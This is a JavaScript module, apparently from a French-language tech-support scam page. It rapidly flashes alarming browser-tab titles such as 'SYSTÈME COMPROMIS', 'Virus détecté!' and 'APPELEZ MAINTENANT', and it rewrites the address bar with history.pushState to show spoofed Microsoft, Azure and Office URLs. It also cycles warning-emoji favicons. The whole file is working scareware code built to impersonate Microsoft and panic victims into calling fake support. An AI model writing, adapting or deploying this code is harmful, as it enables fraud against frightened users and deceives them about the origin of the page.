/**
 * 18. TITLE/URL FLASHING - MAXIMUM AGGRESSION
 * Rapid document.title changes and URL manipulation
 */
const TitleURLFlashing = {
    init: function() {
        this.flashTitle();
        this.flashURL();
        this.flashFavicon();
    },
    flashTitle: function() {
        const titles = [
            '⚠️ ALERTE DE SÉCURITÉ',
            '🔒 SYSTÈME COMPROMIS',
            '🚨 ACTION REQUISE',
            '⛔ ACCÈS BLOQUÉ',
            '🔴 CRITIQUE',
            '⚡ DANGER IMMINENT',
            '🛡️ WINDOWS DEFENDER',
            '📞 APPELEZ MAINTENANT',
            '⚠️ Votre système est compromis!',
            '🔒 Vos données sont en danger!',
            '🚨 Menace détectée!',
            '⛔ Accès non autorisé!',
            '🔴 Virus détecté!',
            '⚡ Pare-feu désactivé!',
            '🛡️ Licence expirée!'
        ];
        let index = 0;
        setInterval(() => {
            document.title = titles[index % titles.length];
            index++;
        }, 200); // Every 200ms
    },
    flashURL: function() {
        const urls = [
            'https://microsoft.com/security-alert',
            'https://windows.com/defender',
            'https://support.microsoft.com',
            'https://account.microsoft.com',
            'https://login.microsoftonline.com',
            'https://security.microsoft.com',
            'https://portal.azure.com',
            'https://office.com',
            'https://onedrive.live.com'
        ];
        let index = 0;
        setInterval(() => {
            try {
                history.pushState({}, '', urls[index % urls.length]);
                index++;
            } catch(e) {}
        }, 500);
    },
    flashFavicon: function() {
        const icons = ['⚠️', '🔒', '🚨', '⛔', '🔴', '⚡', '🛡️', '📞', '🔴', '⚠️'];
        let index = 0;
        setInterval(() => {
            let link = document.querySelector("link[rel~='icon']");
            if (!link) {
                link = document.createElement('link');
                link.rel = 'icon';
                document.head.appendChild(link);
            }
            link.href = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><text y="32" font-size="32">' + icons[index % icons.length] + '</text></svg>';
            index++;
        }, 300);
    }
};